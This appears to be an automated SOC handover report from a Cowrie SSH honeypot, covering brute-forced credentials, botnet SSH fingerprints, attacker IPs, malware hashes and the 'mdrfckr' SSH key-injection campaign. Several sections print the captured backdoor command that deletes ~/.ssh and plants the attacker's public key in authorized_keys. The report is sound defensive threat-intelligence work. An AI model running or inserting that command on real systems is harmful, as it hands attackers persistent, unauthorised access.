# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-17 |
| **Generated At** | 2026-10-17T02:00:40Z |
| **Shift Time** | 02:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **31** |
| Confirmed Threats | **26** |
| False Positives Filtered | **5** (16.1%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **10** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **19** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **157** |
| Unique Credential Pairs | **152** |
| Unique Usernames | **37** |
| Unique Passwords | **143** |
| Successful Auth Pairs | **155** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 102 |
| `test` | 5 |
| `345gs5662d34` | 4 |
| `user` | 4 |
| `ubuntu` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `345gs5662d34` | 4 |
| `123456` | 3 |
| `123` | 3 |
| `P@ssword` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 3 |
| `admin-user` | `admin-user` | 1 |
| `root` | `12345` | 1 |
| `test` | `P@ssword` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin-user` | `admin-user` | `10.0.0.73` | 2026-10-17T00:00:10 |
| `root` | `12345` | `10.0.0.73` | 2026-10-17T00:00:14 |
| `test` | `P@ssword` | `101.96.202.144` | 2026-10-17T00:00:25 |
| `root` | `1q2w3e4r$R#E@W!Q` | `200.196.50.91` | 2026-10-17T00:00:53 |
| `345gs5662d34` | `345gs5662d34` | `200.196.50.91` | 2026-10-17T00:00:56 |
| `test` | `3245gs5662d34` | `101.96.202.144` | 2026-10-17T00:00:56 |
| `root` | `3245gs5662d34` | `200.196.50.91` | 2026-10-17T00:00:57 |
| `hetzner` | `hetzner` | `10.0.0.73` | 2026-10-17T00:00:58 |
| `root` | `123456789` | `10.0.0.73` | 2026-10-17T00:01:06 |
| `root` | `1234567890` | `10.0.0.73` | 2026-10-17T00:01:32 |
| `contabo` | `contabo` | `10.0.0.73` | 2026-10-17T00:01:46 |
| `root` | `123@Qwe` | `10.0.0.73` | 2026-10-17T00:01:58 |
| `root` | `131313` | `10.0.0.73` | 2026-10-17T00:02:23 |
| `user` | `user123` | `10.0.0.73` | 2026-10-17T00:02:33 |
| `root` | `13797979` | `10.0.0.73` | 2026-10-17T00:02:49 |
| `root` | `17` | `10.0.0.73` | 2026-10-17T00:03:15 |
| `user` | `user1!` | `10.0.0.73` | 2026-10-17T00:03:21 |
| `root` | `1Q2W3E4R` | `10.0.0.73` | 2026-10-17T00:03:41 |
| `root` | `1Q2w3e4r` | `10.0.0.73` | 2026-10-17T00:04:08 |
| `lthpc` | `password` | `10.0.0.73` | 2026-10-17T00:04:11 |
_… 135 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **31** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 13 |
| Go SSH scanner | 3 |
| OpenSSH | 2 |
| Paramiko (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 12 | 7 |
| `16443846184e...` | Generic scanner | 2 | 2 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |
| `b21d7cdcc813...` | Mirai/variant | 1 | 1 |
| `a704be057881...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 12 | 7 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `b21d7cdcc813...` | OpenSSH | 1 | 1 | Mirai/variant |
| `a704be057881...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `7216c7c47391...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.96.202.144`, `200.196.50.91`, `167.86.116.159`, `213.230.127.104`, `211.253.9.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **12** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 10 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c72fbe2fed8c

| Field | Detail |
|---|---|
| **Source IP** | `101.96.202[.]144` |
| **First Seen** | 2026-10-17 00:00 |
| **Last Seen** | 2026-10-17 00:05 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:00:24` | `cowrie.session.connect` |
| `2026-10-17 00:00:24` | `cowrie.client.version` |
| `2026-10-17 00:00:24` | `cowrie.client.kex` |
| `2026-10-17 00:00:25` | `cowrie.login.success` |
| `2026-10-17 00:00:26` | `cowrie.session.params` |
| `2026-10-17 00:00:26` | `cowrie.command.input` |
| `2026-10-17 00:00:26` | `cowrie.command.failed` |
| `2026-10-17 00:00:26` | `cowrie.log.closed` |
| `2026-10-17 00:00:27` | `cowrie.session.params` |
| `2026-10-17 00:00:27` | `cowrie.command.input` |
| `2026-10-17 00:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.202[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.96.202[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62953c6d22e5

| Field | Detail |
|---|---|
| **Source IP** | `200.196.50[.]91` |
| **First Seen** | 2026-10-17 00:00 |
| **Last Seen** | 2026-10-17 00:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:00:53` | `cowrie.session.connect` |
| `2026-10-17 00:00:53` | `cowrie.client.version` |
| `2026-10-17 00:00:53` | `cowrie.client.kex` |
| `2026-10-17 00:00:53` | `cowrie.login.success` |
| `2026-10-17 00:00:54` | `cowrie.session.params` |
| `2026-10-17 00:00:54` | `cowrie.command.input` |
| `2026-10-17 00:00:54` | `cowrie.command.failed` |
| `2026-10-17 00:00:54` | `cowrie.log.closed` |
| `2026-10-17 00:00:55` | `cowrie.session.params` |
| `2026-10-17 00:00:55` | `cowrie.command.input` |
| `2026-10-17 00:00:55` | `cowrie.session.file_download` |
| `2026-10-17 00:00:55` | `cowrie.log.closed` |
| `2026-10-17 00:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.196.50[.]91` to AbuseIPDB if not already reported
- [ ] Block `200.196.50[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91e0ae43913

| Field | Detail |
|---|---|
| **Source IP** | `101.96.202[.]144` |
| **First Seen** | 2026-10-17 00:00 |
| **Last Seen** | 2026-10-17 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:00:55` | `cowrie.session.connect` |
| `2026-10-17 00:00:55` | `cowrie.client.version` |
| `2026-10-17 00:00:56` | `cowrie.client.kex` |
| `2026-10-17 00:00:56` | `cowrie.login.success` |
| `2026-10-17 00:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.202[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.96.202[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0090d888f6

| Field | Detail |
|---|---|
| **Source IP** | `200.196.50[.]91` |
| **First Seen** | 2026-10-17 00:00 |
| **Last Seen** | 2026-10-17 00:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:00:56` | `cowrie.session.connect` |
| `2026-10-17 00:00:56` | `cowrie.client.version` |
| `2026-10-17 00:00:56` | `cowrie.client.kex` |
| `2026-10-17 00:00:56` | `cowrie.login.success` |
| `2026-10-17 00:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.196.50[.]91` to AbuseIPDB if not already reported
- [ ] Block `200.196.50[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efcdf0160b73

| Field | Detail |
|---|---|
| **Source IP** | `178.62.59[.]242` |
| **First Seen** | 2026-10-17 00:11 |
| **Last Seen** | 2026-10-17 00:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:11:58` | `cowrie.session.connect` |
| `2026-10-17 00:11:58` | `cowrie.client.version` |
| `2026-10-17 00:11:58` | `cowrie.client.kex` |
| `2026-10-17 00:11:59` | `cowrie.login.success` |
| `2026-10-17 00:11:59` | `cowrie.session.params` |
| `2026-10-17 00:11:59` | `cowrie.command.input` |
| `2026-10-17 00:12:00` | `cowrie.log.closed` |
| `2026-10-17 00:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.62.59[.]242` to AbuseIPDB if not already reported
- [ ] Block `178.62.59[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-864e6ca632e7

| Field | Detail |
|---|---|
| **Source IP** | `211.253.9[.]49` |
| **First Seen** | 2026-10-17 00:19 |
| **Last Seen** | 2026-10-17 00:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:19:12` | `cowrie.session.connect` |
| `2026-10-17 00:19:12` | `cowrie.client.version` |
| `2026-10-17 00:19:12` | `cowrie.client.kex` |
| `2026-10-17 00:19:13` | `cowrie.login.success` |
| `2026-10-17 00:19:14` | `cowrie.session.params` |
| `2026-10-17 00:19:14` | `cowrie.command.input` |
| `2026-10-17 00:19:14` | `cowrie.command.failed` |
| `2026-10-17 00:19:15` | `cowrie.log.closed` |
| `2026-10-17 00:19:15` | `cowrie.session.params` |
| `2026-10-17 00:19:15` | `cowrie.command.input` |
| `2026-10-17 00:19:15` | `cowrie.session.file_download` |
| `2026-10-17 00:19:15` | `cowrie.log.closed` |
| `2026-10-17 00:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.9[.]49` to AbuseIPDB if not already reported
- [ ] Block `211.253.9[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8334f858fb0c

| Field | Detail |
|---|---|
| **Source IP** | `211.253.9[.]49` |
| **First Seen** | 2026-10-17 00:19 |
| **Last Seen** | 2026-10-17 00:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:19:16` | `cowrie.session.connect` |
| `2026-10-17 00:19:16` | `cowrie.client.version` |
| `2026-10-17 00:19:16` | `cowrie.client.kex` |
| `2026-10-17 00:19:17` | `cowrie.login.success` |
| `2026-10-17 00:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.9[.]49` to AbuseIPDB if not already reported
- [ ] Block `211.253.9[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c805f14e3d44

| Field | Detail |
|---|---|
| **Source IP** | `167.86.116[.]159` |
| **First Seen** | 2026-10-17 00:22 |
| **Last Seen** | 2026-10-17 00:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:22:36` | `cowrie.session.connect` |
| `2026-10-17 00:22:36` | `cowrie.client.version` |
| `2026-10-17 00:22:36` | `cowrie.client.kex` |
| `2026-10-17 00:22:36` | `cowrie.login.success` |
| `2026-10-17 00:22:37` | `cowrie.session.params` |
| `2026-10-17 00:22:37` | `cowrie.command.input` |
| `2026-10-17 00:22:37` | `cowrie.command.failed` |
| `2026-10-17 00:22:37` | `cowrie.log.closed` |
| `2026-10-17 00:22:38` | `cowrie.session.params` |
| `2026-10-17 00:22:38` | `cowrie.command.input` |
| `2026-10-17 00:22:38` | `cowrie.session.file_download` |
| `2026-10-17 00:22:38` | `cowrie.log.closed` |
| `2026-10-17 00:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.86.116[.]159` to AbuseIPDB if not already reported
- [ ] Block `167.86.116[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4201c6d19c84

| Field | Detail |
|---|---|
| **Source IP** | `167.86.116[.]159` |
| **First Seen** | 2026-10-17 00:22 |
| **Last Seen** | 2026-10-17 00:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:22:38` | `cowrie.session.connect` |
| `2026-10-17 00:22:38` | `cowrie.client.version` |
| `2026-10-17 00:22:38` | `cowrie.client.kex` |
| `2026-10-17 00:22:39` | `cowrie.login.success` |
| `2026-10-17 00:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.86.116[.]159` to AbuseIPDB if not already reported
- [ ] Block `167.86.116[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255928d0551a

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-10-17 00:24 |
| **Last Seen** | 2026-10-17 00:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:24:36` | `cowrie.session.connect` |
| `2026-10-17 00:24:36` | `cowrie.client.version` |
| `2026-10-17 00:24:36` | `cowrie.client.kex` |
| `2026-10-17 00:24:37` | `cowrie.login.success` |
| `2026-10-17 00:24:38` | `cowrie.session.params` |
| `2026-10-17 00:24:38` | `cowrie.command.input` |
| `2026-10-17 00:24:38` | `cowrie.command.failed` |
| `2026-10-17 00:24:38` | `cowrie.log.closed` |
| `2026-10-17 00:24:39` | `cowrie.session.params` |
| `2026-10-17 00:24:39` | `cowrie.command.input` |
| `2026-10-17 00:24:39` | `cowrie.session.file_download` |
| `2026-10-17 00:24:39` | `cowrie.log.closed` |
| `2026-10-17 00:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b772f71a2e24

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-10-17 00:24 |
| **Last Seen** | 2026-10-17 00:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:24:39` | `cowrie.session.connect` |
| `2026-10-17 00:24:39` | `cowrie.client.version` |
| `2026-10-17 00:24:39` | `cowrie.client.kex` |
| `2026-10-17 00:24:40` | `cowrie.login.success` |
| `2026-10-17 00:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce9737a86c0e

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]32` |
| **First Seen** | 2026-10-17 00:39 |
| **Last Seen** | 2026-10-17 00:44 |
| **Session Duration** | 307s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 00:39:12` | `cowrie.session.connect` |
| `2026-10-17 00:39:17` | `cowrie.client.version` |
| `2026-10-17 00:39:17` | `cowrie.client.kex` |
| `2026-10-17 00:39:19` | `cowrie.login.success` |
| `2026-10-17 00:40:37` | `cowrie.session.file_upload` |
| `2026-10-17 00:41:39` | `cowrie.session.file_upload` |
| `2026-10-17 00:42:38` | `cowrie.session.file_upload` |
| `2026-10-17 00:43:31` | `cowrie.session.file_upload` |
| `2026-10-17 00:44:19` | `cowrie.session.file_upload` |
| `2026-10-17 00:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]32` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `106.13.186[.]96` | 1 | 2026-10-17 00:16 | 2026-10-17 00:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.132[.]64` | 1 | 2026-10-17 00:00 | 2026-10-17 00:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-17 00:01 | 2026-10-17 00:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-17 00:16 | 2026-10-17 00:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `178.62.59[.]242` | 1 | 2026-10-17 00:08 | 2026-10-17 00:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.179[.]77` | 1 | 2026-10-17 00:02 | 2026-10-17 00:03 | 90s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]87` | 1 | 2026-10-17 00:36 | 2026-10-17 00:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]140` | 1 | 2026-10-17 00:52 | 2026-10-17 00:52 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-10-17 00:03 | 2026-10-17 00:03 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]62` | 1 | 2026-10-17 00:49 | 2026-10-17 00:49 | 2s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]59` | 1 | 2026-10-17 00:35 | 2026-10-17 00:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]186` | 1 | 2026-10-17 00:43 | 2026-10-17 00:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.253.235[.]158` | 1 | 2026-10-17 00:18 | 2026-10-17 00:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `92.204.138[.]198` | 1 | 2026-10-17 00:14 | 2026-10-17 00:15 | 32s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
